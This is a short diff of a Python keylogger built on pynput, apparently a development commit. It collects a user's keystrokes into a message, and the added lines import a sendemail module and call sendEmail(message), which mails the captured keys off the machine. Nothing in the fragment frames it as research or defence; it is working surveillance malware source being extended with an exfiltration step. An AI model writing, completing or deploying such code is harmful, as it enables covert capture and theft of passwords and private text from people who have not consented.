@@ -1,5 +1,5 @@
-import pynput
 from pynput.keyboard import Key, Listener
+import sendemail
 
 count = 0
 keys = []
@@ -23,6 +23,7 @@ def email(keys):
             k = ''
         message += k
     print(message)
+    sendemail.sendEmail(message)
 
 def on_release(key):
     if key == Key.esc:
